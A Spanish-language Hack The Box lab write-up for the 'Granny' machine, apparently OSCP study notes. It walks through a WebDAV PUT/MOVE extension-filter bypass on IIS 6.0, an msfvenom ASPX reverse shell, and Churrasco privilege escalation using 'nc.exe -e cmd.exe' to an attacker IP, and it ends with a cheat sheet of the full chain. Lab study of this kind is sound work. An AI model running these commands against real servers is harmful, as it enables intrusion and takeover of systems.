[👵 Granny — HTB [Windows · Easy] 33015bd2d16c81fb9104fa884d7fcbec.md](https://github.com/user-attachments/files/28265720/Granny.HTB.Windows.Easy.33015bd2d16c81fb9104fa884d7fcbec.md)
# 👵 Granny — HTB [Windows · Easy]

> **Plataforma:** Hack The Box | **OS:** Windows Server 2003 x86 (IIS 6.0) | **Dificultad:** Easy | **Técnica:** WebDAV PUT+MOVE Bypass + SeImpersonatePrivilege
> 

| Campo | Detalle |
| --- | --- |
| IP | `10.129.11.3` |
| Foothold | WebDAV — PUT como .txt + MOVE a .aspx (bypass de filtro de extensiones) |
| Acceso inicial | Shell como **nt authority\network service** |
| PrivEsc | SeImpersonatePrivilege → Churrasco.exe |
| Acceso final | **NT AUTHORITY\SYSTEM** |
| Transferencia | impacket-smbserver (certutil inestable en Win2003) |

---

# 1. Reconocimiento

## Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 -oN granny_full.nmap 10.129.11.3
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: OPTIONS TRACE GET HEAD DELETE PUT COPY MOVE PROPFIND
|   Potentially risky methods: TRACE DELETE PUT COPY MOVE PROPFIND
| http-webdav-scan:
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
```

**Datos clave:**

- IIS 6.0 → Windows Server 2003, arquitectura **x86 (32 bits)**.
- Métodos HTTP habilitados: `PUT`, `MOVE`, `COPY`, `DELETE`, `PROPFIND` → superficie de ataque WebDAV completa.
- `PUT` habilitado = posible subida de archivos directa.

## Auditoría con Davtest

```bash
davtest -url http://10.129.11.3
```

**Hallazgos críticos:**

- `PUT` habilitado ✅ — se pueden subir archivos.
- Extensiones `.asp` y `.aspx` **bloqueadas** en la subida directa ❌.
- Extensiones `.txt` y `.html` **permitidas** ✅.
- Método `MOVE` habilitado ✅ — se pueden renombrar archivos en el servidor.

> La combinación PUT + MOVE es el vector: subir como `.txt` (permitido) y luego renombrar a `.aspx` (ejecutable) usando MOVE.
> 

---

# 2. Intento Fallido — CVE-2017-7269 Buffer Overflow

Antes de descubrir el vector PUT/MOVE, se intentó el Buffer Overflow de WebDAV (mismo que Grandpa).

**Síntoma:** `Connection reset` repetido y `socket error`. La shell nunca conectaba.

**Causa:** La explotación de BoF corrompe la memoria del proceso IIS. En Granny la inestabilidad era peor que en Grandpa, probablemente por el estado del servicio. El exploit llegaba a ejecutarse pero el proceso moría antes de establecer la conexión.

**Decisión correcta:** Pivotar inmediatamente a un método más limpio. El PUT/MOVE no toca la memoria — sube un archivo legítimo y lo ejecuta. Es infinitamente más estable.

---

# 3. Foothold — WebDAV PUT + MOVE Bypass

## ¿Por qué funciona este bypass?

IIS 6.0 tiene dos validaciones separadas:

1. **Validación de subida (PUT):** Comprueba la extensión del archivo que se está subiendo. Bloquea `.asp`, `.aspx`, etc.
2. **Validación de ejecución:** Comprueba la extensión del archivo cuando se solicita via web.

El bypass abusa de que **el método MOVE no re-valida** la extensión del archivo destino con las mismas reglas que el PUT. Subes `.txt` (pasa la validación de subida), luego MOVE lo renombra a `.aspx` en el servidor, y cuando lo solicitas via web IIS lo ejecuta como [ASP.NET](http://ASP.NET).

## Paso A — Generar el payload .aspx

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f aspx -o shell.aspx

# Renombrar a .txt para la subida
cp shell.aspx shell.txt
```

## Paso B — Subir el payload como .txt (PUT)

```bash
curl -X PUT http://10.129.11.3/shell.txt \
  --data-binary @shell.txt

# Verificar que se subió
curl -s http://10.129.11.3/shell.txt | head -5
# → debe devolver el contenido ASPX, no un 404
```

## Paso C — Renombrar a .aspx (MOVE)

```bash
curl -X MOVE \
  -H "Destination: http://10.129.11.3/shell.aspx" \
  http://10.129.11.3/shell.txt

# → HTTP 201 Created = éxito
```

## Paso D — Listener y trigger

```bash
nc -lvnp 4444
```

```bash
curl http://10.129.11.3/shell.aspx
```

## Shell recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.129.11.3]
Microsoft Windows [Version 5.2.3790]

c:\windows\system32\inetsrv> whoami
nt authority\network service
```

---

# 4. Enumeración Post-Foothold

## Primer comando siempre

```bash
whoami /priv
```

```
Privilege Name                  State
=============================== ========
SeImpersonatePrivilege          Enabled   ← VECTOR CRÍTICO
```

**SeImpersonatePrivilege habilitado** → misma ruta que Grandpa → Churrasco.

```bash
systeminfo
```

```
OS Name:    Microsoft Windows Server 2003 R2
System Type: X86-based PC
```

Windows 2003 x86 confirmado → **Churrasco** (no JuicyPotato, no PrintSpoofer).

---

# 5. Escalada de Privilegios — SeImpersonatePrivilege + Churrasco

## Transferir herramientas con SMB

```bash
# En Kali — desde la carpeta con churrasco.exe y nc.exe
impacket-smbserver share . -smb2support
```

```bash
:: Copiar a C:\wmpub\ (directorio con permisos de escritura para network service)
copy \\10.10.14.X\share\churrasco.exe C:\wmpub\churrasco.exe
copy \\10.10.14.X\share\nc.exe C:\wmpub\nc.exe
```

> **Por qué C:wmpub:** El directorio `C:\Windows\Temp` puede tener restricciones para network service en algunos sistemas. `C:\wmpub\` es el directorio de Windows Media Player que suele tener permisos amplios. Alternativamente probar `C:\inetpub\wwwroot\` si el primero falla.
> 

## Listener para SYSTEM

```bash
nc -lvnp 5555
```

## Ejecución de Churrasco

```bash
C:\wmpub\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.X 5555"
```

## Shell SYSTEM recibida

```
connect to [10.10.14.X] from (UNKNOWN) [10.129.11.3]
Microsoft Windows [Version 5.2.3790]

C:\Windows\Temp> whoami
nt authority\system
```

## Flags

```bash
type C:\Documents and Settings\Lakis\Desktop\user.txt
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

> **Recuerda:** En Windows Server 2003/XP los perfiles están en `C:\Documents and Settings\` no en `C:\Users\`. Usar siempre `dir /s /b C:\user.txt` si no sabes el nombre del usuario.
> 

---

# 6. Historial de Errores — Lo Que Falló y Por Qué

| # | Problema | Error | Causa raíz |
| --- | --- | --- | --- |
| 1 | CVE-2017-7269 Buffer Overflow | `Connection reset` / `socket error` repetido | BoF corrompe memoria IIS → inestable → pivotar a PUT/MOVE |
| 2 | PUT directo de shell.aspx | HTTP 403 Forbidden | IIS 6.0 bloquea subida directa de extensiones ejecutables |
| 3 | certutil para transferir binarios | Inestable / errores en Win2003 | certutil antiguo sin soporte HTTP completo → usar impacket-smbserver |
| ✅ | PUT .txt + MOVE a .aspx + Churrasco | **SYSTEM shell** | Bypass limpio de filtro de extensiones + exploit correcto para Win2003 |

---

# 7. Moralejas y Notas para el OSCP

## Moraleja 1 — Davtest antes de cualquier intento en IIS con WebDAV

Antes de lanzar exploits de memoria, ejecutar `davtest` siempre que veas IIS con WebDAV. Si `PUT` está habilitado y puedes subir archivos de algún tipo, ya tienes un vector más limpio, más estable y más profesional que un BoF.

```bash
davtest -url http://TARGET
```

Lo que buscas: qué extensiones puedes subir con PUT y si MOVE/COPY están habilitados. La combinación PUT (extensión permitida) + MOVE (renombrar a extensión ejecutable) es el bypass estándar en IIS 6.0.

---

## Moraleja 2 — El bypass PUT/MOVE: entender por qué funciona

IIS 6.0 valida la extensión en la subida (PUT) pero no re-valida cuando MOVE renombra el archivo. Es un fallo de diseño — dos operaciones distintas con distintas reglas de validación.

El patrón completo memorizado:

```bash
# 1. Generar payload en el formato ejecutable deseado
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx

# 2. Subir con extensión permitida
curl -X PUT http://TARGET/shell.txt --data-binary @shell.aspx

# 3. Renombrar a extensión ejecutable
curl -X MOVE -H "Destination: http://TARGET/shell.aspx" http://TARGET/shell.txt

# 4. Ejecutar
curl http://TARGET/shell.aspx
```

Este patrón es silencioso, no corrompe nada y funciona perfectamente.

---

## Moraleja 3 — Saber cuándo abandonar un exploit inestable

El BoF de CVE-2017-7269 funcionó en Grandpa pero no en Granny. Dos máquinas con el mismo IIS 6.0 y el mismo CVE, resultado diferente. La diferencia estaba en el estado de la memoria del proceso.

La regla para el OSCP: **si un exploit da Connection Reset más de 2-3 veces y tienes otro vector disponible, pivota**. No hay gloria en pasar 2 horas forzando un exploit inestable cuando tienes PUT/MOVE disponible.

El tiempo en el OSCP es el recurso más escaso.

---

## Moraleja 4 — whoami /priv es el segundo comando, siempre

Igual que en Grandpa. `SeImpersonatePrivilege` en `network service` es la señal verde para Churrasco en Win2003. Este privilegio aparece en cualquier proceso de servicio de red en Windows — IIS, MSSQL, etc. Reconocerlo inmediatamente ahorra tiempo.

```bash
whoami          ← quién soy
whoami /priv    ← qué puedo hacer
systeminfo      ← qué OS/arquitectura tengo
```

Esos tres comandos en los primeros 60 segundos de cualquier shell Windows.

---

## Moraleja 5 — Granny vs Grandpa: mismo OS, diferente vector de entrada

Granny y Grandpa son casi idénticas — mismo OS (Win2003 x86), mismo PrivEsc (Churrasco), mismo método de transferencia (SMB). La diferencia está en el foothold:

|  | Grandpa | Granny |
| --- | --- | --- |
| Foothold | CVE-2017-7269 BoF | WebDAV PUT+MOVE bypass |
| Estabilidad | Inestable (BoF) | Estable (file upload) |
| Ruido | Alto (corrompe memoria) | Bajo (operación normal de WebDAV) |
| Complejidad | Alta (shellcode alfanumérico, ROP) | Baja (curl + curl) |

Granny enseña que el método más simple suele ser el mejor. Dos curl commands versus un BoF con encoder específico y ROP chain — el resultado es el mismo pero uno es infinitamente más fiable.

---

## Moraleja 6 — El patrón completo de Granny

```
nmap → IIS 6.0 + WebDAV habilitado
    ↓
davtest → PUT habilitado, .aspx bloqueado, .txt permitido, MOVE habilitado
    ↓
msfvenom → shell.aspx guardado como shell.txt
    ↓
curl PUT shell.txt → curl MOVE a shell.aspx → curl shell.aspx → shell
    ↓
whoami /priv → SeImpersonatePrivilege enabled
    ↓
impacket-smbserver → copy churrasco.exe + nc.exe a C:\wmpub\
    ↓
churrasco.exe -d "nc.exe -e cmd.exe IP PORT" → SYSTEM
```

---

# 8. Comandos Clave — Cheat Sheet

```bash
# Auditar WebDAV
davtest -url http://10.129.11.3

# Generar payload ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f aspx -o shell.aspx

# Subir como .txt (bypass filtro PUT)
curl -X PUT http://10.129.11.3/shell.txt --data-binary @shell.aspx

# Renombrar a .aspx (bypass MOVE)
curl -X MOVE -H "Destination: http://10.129.11.3/shell.aspx" http://10.129.11.3/shell.txt

# Listener + trigger
nc -lvnp 4444
curl http://10.129.11.3/shell.aspx

# Post-foothold
whoami /priv
systeminfo

# Transferir herramientas
# Kali:
impacket-smbserver share . -smb2support
# Víctima:
copy \\TU_IP\share\churrasco.exe C:\wmpub\
copy \\TU_IP\share\nc.exe C:\wmpub\

# Listener SYSTEM + Churrasco
nc -lvnp 5555
C:\wmpub\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe TU_IP 5555"

# Flags (Win2003 usa Documents and Settings)
dir /s /b C:\user.txt
dir /s /b C:\root.txt
```

![image.png](%F0%9F%91%B5%20Granny%20%E2%80%94%20HTB%20%5BWindows%20%C2%B7%20Easy%5D/image.png)
